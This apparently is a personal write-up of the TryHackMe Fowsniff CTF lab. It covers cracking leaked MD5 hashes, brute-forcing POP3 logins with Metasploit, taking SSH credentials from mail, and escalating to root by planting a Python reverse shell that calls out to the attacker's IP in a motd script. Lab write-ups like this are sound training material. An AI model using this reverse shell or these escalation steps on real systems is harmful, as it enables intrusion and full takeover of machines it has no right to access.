<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>fowsniff ctf</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>fowsniff ctf</h1><br/><strong><h1>THM: Fowsniff CTF</h1></strong><br /><br />This is a guided CTF, thus I will follow THM guidlines.<br /><br /><strong><h2>Enumeration</h2></strong><br /><br /><strong>Rustscan &amp; Nmap</strong><br /><img src="images/43-1.png" alt="images/43-1.png" /><br /><br />Open Ports: <strong>22,80,110,143</strong><br /><br /><br /><strong>Website Enumeration</strong><br /><img src="images/43-2.png" alt="images/43-2.png" /><br />The organization is claiming that the employee data was leaked and may be available at twitter handle.<br /><br /><strong>Google Search</strong><br />Upon searching google for Fowsniff Corp, we get a twitter page which is hacked<br /><img src="images/43-3.png" alt="images/43-3.png" /><br /><br />Lets open the <strong>pastebin</strong> link.<br /><strong>https://pastebin.com/NrAqVeeX</strong><br /><br /><img src="images/43-4.png" alt="images/43-4.png" />\<br /><br />In this page we find the following user hashes and also discovered that the hashes are MD5.<br /><br />mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4<br />mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56<br />tegel@fowsniff:1dc352435fecca338acfd4be10984009<br />baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb<br />seina@fowsniff:90dc16d47114aa13671c697fd506cf26<br />stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd<br />mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b<br />parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11<br />sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e<br /><br />We decode them all at <strong>https://hashes.com/en/decrypt/hash</strong><br /><img src="images/43-5.png" alt="images/43-5.png" /><br /><br />All hashes were cracked exclusing one. I will try to crack it using <strong>hashcat</strong><br /><strong>Note:</strong> it can also be decoded using hashcat.<br /> <br /> Hashcat couldn&#39;t crack the leftout one using rockyou.txt<br /> <br /> <br /> For demo: I tried <strong>hashcat -m 0 19f5af754c31f1e2651edde9250d69bb /usr/share/wordlists/rockyou.txt </strong><br />As expected we got the password as: <strong>skyler22</strong><br /><br /><img src="images/43-6.png" alt="images/43-6.png" /><br /><br /><br /><br />Next, as per THM hint, we will use <strong>metasploit</strong> to bruteforce the <strong>pop3</strong> (mail) service. [Expecting to find certain users who have&#39;t changed their password]<br /><br /><strong>Note:</strong> We can use <strong>hydra</strong> to bruteforce <strong>pop3</strong>, however <strong>hydra</strong> uses <strong>cluster-bomb</strong> method by default. (All usernames checked with all passwords)<br />However, we ideally need pitchfork style of bruteforce where we use particular  username &amp; password combinations only.<br /><br /><strong>Metasploit</strong><br /><br /><strong>Note:</strong> After running i discovered that <strong>metasploit</strong> will also use <strong>cluster-bomb</strong> unless we use <strong>USERPASS_FILE</strong>. <br />To use this we need to set <strong>USER_FILE</strong> &amp; <strong>PASS_FILE</strong> to a dummy blank file.<br />By Default: The scanner used has a default user and password file. (We need to replace it with dummy blank file)<br />I created a blank file test.txt<br /><br />We use <strong>auxiliary/scanner/pop3/pop3_login</strong> as per the hint.<br />I collected the usernames and passwords and created a <strong>userpass.txt</strong><br /><img src="images/43-7.png" alt="images/43-7.png" /><br /><br />Following <strong>options</strong> are added:<br /><img src="images/43-8.png" alt="images/43-8.png" /><br /><br /><strong>Note: </strong>The file test.txt is blank. It&#39;s used to force use the <strong>USERPASS_FILE</strong> to have <strong>pitchfork</strong> bruteforce<br />Now, we run it.<br /><img src="images/43-9.png" alt="images/43-9.png" /><br /><br /><strong>POP3 Credentials Found:</strong><br />Username:	<strong>seina</strong><br />Password:	<strong>scoobydoo2</strong><br /><br /><strong>Mail Enumeration</strong><br /><img src="images/43-10.png" alt="images/43-10.png" /><br /><br />We found 2 Emails. We read it using RETR 1,2.<br />The first mail has SSH credentais.<br />The second mail&#39;s sender is the user. (As per THM hint)<br /><br /><img src="images/43-11.png" alt="images/43-11.png" /><br /><br /><strong>SSH Credentials Found</strong><br />Username:	<strong>backsteen</strong><br />Password: 	<strong>S1ck3nBluff+secureshell</strong><br /><br /><strong><h2>Foothold</h2></strong><br /><br />Lets SSH into the machine with the above credentials.<br /><img src="images/43-12.png" alt="images/43-12.png" /><br /><br /><strong>Note:</strong> The user is a member of group <strong>users</strong><br />Lets see what files belong to that group<br /><br /><strong>find / -type f -group users -exec ls -l {} \+ 2&gt;/dev/null</strong><br /><br /><img src="images/43-13.png" alt="images/43-13.png" /><br /><br />We have an intresting file <strong>cube.sh</strong> and its <strong>writable</strong> by group <strong>users</strong><br />Lets view it.<br /><br /><img src="images/43-14.png" alt="images/43-14.png" /><br /><br />It looks like the welcome message we get when we <strong>login</strong>.<br /><br />However, we need to see how this file is getting used during the SSH Login process.<br />For that we check the THM Hint: Look at the file<strong> /etc/update-motd.d/ </strong>folder.<br /><br />In the folder, we found a <strong>00-header</strong> file which belongs to root and is called everytime a SSH Login is made.<br />Luckily the cube.sh file is being called in the file at the bottom.<br /><br /><img src="images/43-15.png" alt="images/43-15.png" /><br /><br />As we have write permission on cube.sh, we will include a python reverse shell in the script and when we login again it will be called.<br /><br />1. Edit the <strong>cube.sh</strong> file &amp; add the python reverse shell code<br />2. Start the netcat listener<br />3. Exit from SSH and login again.<br />4. We should have the root connection in the listner.<br /><br /><strong>Python Reverse Shell Code:</strong><br />#!/bin/bash<br />python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.11.72.31&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;<br /><br /><strong>Final cube.sh:</strong><br /><br /><img src="images/43-16.png" alt="images/43-16.png" /><br /><br /><br />Start Netcat Listener and Relogin into SSH. We should have the root connection.<br /><br /><img src="images/43-17.png" alt="images/43-17.png" /><br /><br />Thus, we have full root access.<br /><br />Thanks!!</div>
</body>
</html>
